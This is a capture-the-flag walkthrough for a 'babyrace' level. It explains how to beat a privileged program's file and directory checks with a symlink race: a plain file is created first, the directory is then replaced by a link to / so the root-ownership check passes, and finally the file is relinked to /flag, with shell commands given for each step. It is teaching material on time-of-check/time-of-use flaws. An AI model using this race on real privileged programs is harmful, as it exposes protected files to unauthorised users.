The challenge now checks the directory that the file resides.

Therefore, we have to evade this check to get the flag.

Firstly, open two shells. One for running the challenge the other for managing the filesystem.

Run the challenge with the following command.
```
/babyrace_level5_teaching1 path/file
```

To evade the first stage check, we will create a normal directory and a normal file.
```
mkdir path
cd path
echo fail > file
```

These commands will work for the following reasons.
1. The path does not contain `flag`.
2. We can get file information as it exists.
3. It is not a symlink.

Let's move on to the second stack check.
```
pcVar2 = strdup((char *)argv[1]);
pcVar2 = dirname(pcVar2);
iVar1 = stat(pcVar2,&local_a8);
```

As you can see, it copies the command-line argument, extracts directory name, and get the status of it.

As the directory should be owned by root, we have to make use of the fact that `stat` function follows the symbolic link.

Please use these commands for the second stage check.
```
rm -rf path
ln -s / path
```

`dirname` function will return a string `"path"`. After that, `stat("path", &local_a8)` will be run.

Since we have created a symlink beforehand, `stat` function will follow the symlink and read the top-level directory.

In the second stage check, it is important to know that the check does not care about whether the file exists or not.

That is why this kind of attack works.

Now, you have passed all the checks.

Before the final move, you have to make the path points to the `/flag` file with the following command.
```
rm -rf path
mkdir path
cd path
ln -s /flag file
```

The flag will be printed on your monitor.
